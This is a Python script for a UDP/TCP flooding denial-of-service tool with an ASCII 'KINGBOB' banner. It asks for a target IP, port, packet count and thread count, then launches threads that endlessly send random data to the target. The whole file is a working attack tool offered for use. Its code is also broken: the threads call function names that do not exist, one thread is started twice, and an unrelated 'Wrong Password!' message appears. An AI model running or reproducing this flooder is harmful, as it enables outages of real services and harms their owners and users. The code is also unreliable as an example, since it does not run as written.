import random
import socket
import threading
import os, sys
import time
from termcolor import colored
# Bold
BBlack="\033[1;30m"       # Black
BRed="\033[1;31m"         # Red
BGreen="\033[1;32m"       # Green
BYellow="\033[1;33m"      # Yellow
BBlue="\033[1;34m"        # Blue
BPurple="\033[1;35m"      # Purple
BCyan="\033[1;36m"        # Cyan
BWhite="\033[1;37m"       # White
time.sleep(3)
os.system("clear")
print('''\033[1;34m
                                                    
------------------------------------------------------------------                                                                  
@@@  @@@  @@@  @@@  @@@   @@@@@@@@  @@@@@@@    @@@@@@   @@@@@@@   
@@@  @@@  @@@  @@@@ @@@  @@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  
@@!  !@@  @@!  @@!@!@@@  !@@        @@!  @@@  @@!  @@@  @@!  @@@  
!@!  @!!  !@!  !@!!@!@!  !@!        !@   @!@  !@!  @!@  !@   @!@  
@!@@!@!   !!@  @!@ !!@!  !@! @!@!@  @!@!@!@   @!@  !@!  @!@!@!@   
!!@!!!    !!!  !@!  !!!  !!! !!@!!  !!!@!!!!  !@!  !!!  !!!@!!!!  
!!: :!!   !!:  !!:  !!!  :!!   !!:  !!:  !!!  !!:  !!!  !!:  !!!  
:!:  !:!  :!:  :!:  !:!  :!:   !::  :!:  !:!  :!:  !:!  :!:  !:!  
 ::  :::   ::   ::   ::   ::: ::::   :: ::::  ::::: ::   :: ::::  
 :   :::  :    ::    :    :: :: :   :: : ::    : :  :   :: : ::   
------------------------------------------------------------------                                                                      
                                                                      ''')
choice = str(input("\033[1;32m Attack Methods (Udp/Tcp) \033[1;32m<===> "))
ip = str(input("\033[1;32m IP Target \033[1;32m<===> "))
port = int(input("\033[1;32m Port Target \033[1;32m<===> "))
times = int(input("\033[1;32m Enter Packets \033[1;32m<===> "))
threads = int(input("\033[1;32m Enter Threads \033[1;32m<===> "))

def xxbr():
  	data = random._urandom(1050)
  	while True:
  		try:
  			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  			addr = (str(ip),int(port))
  			for x in range(times):
  				s.sendto(data,addr)
  				s.sendto(data,addr)
  				s.sendto(data,addr)
  				s.sendto(data,addr)
  				s.sendto(data,addr)
  			print("\033[1;33m[â€¢]KINGBOB Attack This Ip %s Port %s"%(ip,port))
  		except:
  			print("\033[1;31mÃ— Warning!")
  
def xxbr2():
  	data = random._urandom(102400)
  	while True:
  		try:
  			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  			s.connect((ip,port))
  			s.send(data)
  			for x in range(times):
  				s.send(data)
  			print("\033[1;36m[â€¢]KINGBOBAttack This Ip %s Port %s"%(ip,port))
  		except:
  			s.close()
  			print("\033[1;33mÃ— Warning!")
              
for y in range(threads):
  	if choice == 'Udp':
  		th = threading.Thread(target = KINGBOBAttack)
  		th.start()
  	elif choice == 'Tcp':
  		th = threading.Thread(target = KINGBOBAttack2)
  		th.start()
  		th.start()
else:
  print("\033[1;31m[!] Wrong Password!")
